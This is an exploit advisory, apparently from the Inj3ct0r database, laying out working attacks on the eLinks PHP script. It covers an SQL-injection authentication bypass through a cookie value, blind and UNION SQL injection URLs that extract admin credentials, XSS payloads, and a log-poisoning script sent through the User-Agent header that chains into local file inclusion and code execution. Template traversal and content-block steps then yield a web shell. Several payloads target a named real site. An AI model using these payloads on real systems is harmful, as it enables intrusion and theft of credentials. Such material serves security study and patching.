eLinks [blind Sql injection / Xss / LFI] Vulnerabilities
========================================================


1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0                          
0     _                   __           __       __                     1
1   /&#039; \            __  /&#039;__`\        /\ \__  /&#039;__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /&#039; _ `\ \/\ \/_/_\_<_  /&#039;___\ \ \/\ \ \ \ \/\`&#039;__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      0
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-1

#[+] Discovered By   : Inj3ct0r
#[+] Site            : Inj3ct0r.com
#[+] support e-mail  : submit[at]inj3ct0r.com


eLinks suffers from remote blind SQL injection, cross site scripting, and local file inclusion vulnerabilities. 
	
# 1 [Bypass Authentication]


	
Necessary condition: magic_quotes_gpc = Off

The first thing I decided to check the admin login panel (http:// [elinks] / asm_admin.php) to filter the fields. 
But unfortunately, all the POST-data filtering built setGPC.

[core/asm_config.php]

PHP code:

 function setGPC (&$array) 
{ // begin function: setGPC 
    foreach ($array as $key => $value) { 
        if (true == is_array($value)) { 
            setGPC($array[$key]); 
        } else { 
            $array[$key] = addslashes($value); 
        } 
    } 
    reset($array); 
} // end function: setGPC 
--------------------------- 
if (!get_magic_quotes_gpc()) { 
    setGPC($_POST); 
    reset($_POST); 
} 


As we have seen, only POST-filtered data, which can not but rejoice. 
Then I began to explore the algorithm authentication (user authentication).

[core/asm_function.php]


PHP code:

function auth () 
{ 
    global $api;  
    $session = @$_COOKIE[&#039;acore&#039;]; 
    if ($session != &#039;&#039; && $session != &#039;-1&#039;) 
    { 
        if (true == isset($_SESSION[&#039;user&#039;][&#039;groups&#039;])) { return true; } 

        $rs = $api->DB->query("SELECT * FROM asm_s_members WHERE session = &#039;".$session."&#039; LIMIT 1"); 
         
        if ($rs->count() == 1) 
        { 
            $_SESSION[&#039;user&#039;] = $rs->row(); 
            $api->DB->query("UPDATE asm_s_members SET atime = &#039;".time()."&#039; WHERE session = &#039;".$session."&#039; LIMIT 1"); 
            return true; 
        } 
    } 
    setAuth(0); 
     
} 


Authentication is carried out by COOKIE-variable acore.
Defined by the variable value:

word&#039; OR member_id = &#039;1

Receives a request:

SELECT * FROM asm_s_members WHERE session = &#039;word&#039; OR member_id = &#039;1&#039; LIMIT 1

	
As the session with the name of &#039;word&#039; can not exist, there is sample data administrator (member_id = 1).
Refreshes your page and appear in the admin panel.
As a result, even without knowing the username, we can login as any user.


	
# 2 Blind sql inj3ct0r in search of:

	
Necessary condition: magic_quotes_gpc = Off

http://www.***.com/eLinks-search.php?action=search&word=asian&#039;+or+1=1+and+substring(version(),1,1)=5--+1

Shell :

In the admin go to template editor, to edit the templates do not have enough rights, but it can create the files:
In sortsah in the form of changing the hidden field with the name of the file to:

<input type = "hidden" name = "template_name" value ="../../../../../ home / tgp /***/ links/1.php ">

Getting shell.

# XSS :

/v2/searcherror.php?errormsg=<script>alert(/asd/);</script>

eLinks-search.php?action=result&word=%3Cscript%3Ealert(&#039;xss&#039;);%3C/script%3E&user_key=1601668980&page=1&pages=-0

# Sql inj3ct0r :

...modules/content/pub.content.php?url=/celebs/view&view=[sql inj]

	
sample:

http://yobt.com/modules/content/pub.content.php?url=/celebs/view&view=-1&#039;+union+select+1,2,3,4,5,6,7,8,9,10,11,12,concat(user_login,3x0a,user_pass),14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29+from+asm_s_members+limit+0,1/*

# Elinks LFI :

	
1. Login in asm_admin.php with any username and password;
	
2. get the message about wrong password, but, nevertheless, $ _SESSION [ &#039;user&#039;] [ &#039;member_id&#039;]) becomes equal to 0

3../core/asm_config.php :

PHP code:

if ( strpos($_SERVER[&#039;HTTP_USER_AGENT&#039;], &#039;vdebug&#039;) ) { set_error_handler(&#039;error_handler&#039;); } 
function error_handler ($errno, $errmsg, $filename, $linenum, $vars) 
{ // BEGIN function 
    if ($errno == 2048 || error_reporting() == 0) { return true; } 
     
    $error_file = $_SERVER[&#039;DOCUMENT_ROOT&#039;].&#039;/files/logs/error.xml&#039;; 
    $_request_url = (true == isset($_SERVER[&#039;REQUEST_URI&#039;])) ? &#039;http://&#039;.$_SERVER[&#039;HTTP_HOST&#039;].$_SERVER[&#039;REQUEST_URI&#039;] : &#039;http://&#039;.$_SERVER[&#039;HTTP_HOST&#039;].&#039;/&#039;; 
    $_http_referer = (true == isset($_SERVER[&#039;HTTP_REFERER&#039;])) ? $_SERVER[&#039;HTTP_REFERER&#039;] : &#039;&#039;; 
    $_remote_addr = (true == isset($_SERVER[&#039;REMOTE_ADDR&#039;])) ? $_SERVER[&#039;REMOTE_ADDR&#039;] : &#039;&#039;; 
    $_http_user_agent = (true == isset($_SERVER[&#039;HTTP_USER_AGENT&#039;])) ? $_SERVER[&#039;HTTP_USER_AGENT&#039;] : &#039;&#039;; 
    $error_content = &#039; 
    <error date="&#039;.date("Y-m-d H:i:s").&#039;"> 
        <request_url>&#039;.$_request_url.&#039;</request_url> 
        <http_referer>&#039;.$_http_referer.&#039;</http_referer> 
        <remote_addr>&#039;.$_remote_addr.&#039;</remote_addr> 
        <http_user_agent>&#039;.$_http_user_agent.&#039;</http_user_agent> 
        <error_number>&#039;.$errno.&#039;</error_number> 
        <error_message>&#039;.$errmsg.&#039;</error_message> 
        <file_name>&#039;.$filename.&#039;</file_name> 
        <line_number>&#039;.$linenum.&#039;</line_number> 
    </error> 
</xml>&#039;; 
    $fp = @fopen($error_file, &#039;r+&#039;); 
    if ($fp) { 
        $cursor_position = filesize($error_file)-7; 
        fseek($fp, $cursor_position); 
        fwrite($fp, $error_content); 
        fclose($fp); 
    } else { 
        $fp = fopen($error_file, &#039;w&#039;); 
        if ($fp) { 
            fwrite($fp, "<xml>\n".$error_content); 
            fclose($fp); 
        } 
    } 

	
4. under this code a http packet with the help of a script:

PHP code:

<? 

set_time_limit (0); 
$site=&#039;yobt.com&#039;; 
$path=&#039;/asm_admin.php?update=1&#039;;  

    $fp = fsockopen($site, 80, $errno, $errstr, 30);     

        $out = "GET $path HTTP/1.1\r\n"; 
        $out .= "Host: $site\r\n"; 
       $out .= "Content-type: application/x-www-form-urlencoded\r\n"; 
          $out .= "Connection: Close\r\n"; 
        $out .= "User-Agent: Opera vdebug <?php phpinfo() ?>\r\n"; //Ñ‚ÑƒÑ‚ Ð½Ð°Ñˆ ÐºÐ¾Ð´ Ð´Ð»Ñ Ð¸Ð½ÐºÐ»ÑƒÐ´Ð° 
        $out .= "Referer: http://laa.com\r\n"; 

        $out .= "Cookie: 1=2;\r\n\r\n"; 

     fwrite($fp, $out); 

    while (!feof($fp))  
{ 
print fread($fp, 4800); 
} 
print $out; 


?>

	
instead asm_admin.php? update = 1 any other file that generates the error pohape (for this site come http://yobt.com/asm.pornstars.search.php);

	

6. in. / asm_clean.php passes authentication :

PHP code:

 if (isset($_SESSION[&#039;user&#039;][&#039;member_id&#039;]) != &#039;1&#039; && SERVER_IP != $_SERVER[&#039;REMOTE_ADDR&#039;]) { 
    die(&#039;Access denied&#039;); 
} 


(so as login prior to the admin and the variable $ _SESSION [ &#039;user&#039;] [ &#039;member_id&#039;] exists);

7. go below code and see

PHP code:

 if (false == isset($_GET[&#039;asm&#039;])) { die(&#039;Map command not found&#039;); } 
$file = base64_decode($_GET[&#039;asm&#039;]); 
... 
include(PATH.$file); 

	
8. only include our error.xml =)
http://yobt.com/asm_clean.php?asm=L2ZpbGVzL2xvZ3MvZXJyb3IueG1s link to see the withdrawal of phpinfo (unless, of course, authorized, as I wrote above)



--------------------------------------------------------------------------

Elinks arbitrary code execution
(for this site is not suitable, because admins removed from the distribution default file. / core / asm_xml_content.php, but still)

1. ./core/asm_xml_content.php

PHP code:

<?php 
error_reporting(7); 
$page = (true == isset($_GET[&#039;page&#039;])) ? $_GET[&#039;page&#039;] : &#039;index&#039;; 
$page = $_SERVER[&#039;DOCUMENT_ROOT&#039;].&#039;/files/tpl/&#039;.$page.&#039;.xml&#039;; 

if (true == file_exists($page)) { 
    $filemtime = filemtime($page); 
    $filemtime = ($filemtime > 10000) ? $filemtime : time()+3600; 
    $fp = fopen($page, &#039;r&#039;); 
    $content = fread($fp, filesize($page)); 
    fclose($fp); 
    $content = "?>".$content."<?php "; 
    ob_start(); 
    eval ($content);


	
2. Add in. / Files / error.xml our pohape manner described above;
3. Out of our code through http://elinks/core/asm_xml_content.php?page=../logs/error

-----------------------------------------

Local include :

core/xmlrpc.php

PHP code:

$xmlrpc_server = trim( $_GET[&#039;xmlrpc_server&#039;] ); 
$uri = parse_url( $_SERVER[&#039;REQUEST_URI&#039;] ); 
if ( $uri[&#039;query&#039;] ) 
{ 
    parse_str( $uri[&#039;query&#039;], $_GET ); 
} 
if ( true == is_file( PATH."/modules/".$xmlrpc_server."/xmlrpc_server.php" ) ) 
{ 
    include_once( PATH."/modules/".$xmlrpc_server."/xmlrpc_server.php" );


As we can see the data from $ _GET [ &#039;xmlrpc_server&#039;], without any filtering into include

Example:
<div class = "smallfont" style = "m


Get shell :

Get shell can also be via the Content Manager-> Content Blocks
Adding a new block:

Name: whatever
Alias: s.php
Content: <? Php phpinfo ();?>
Status: inactive

Get Shell: /files/blocks/.s.php




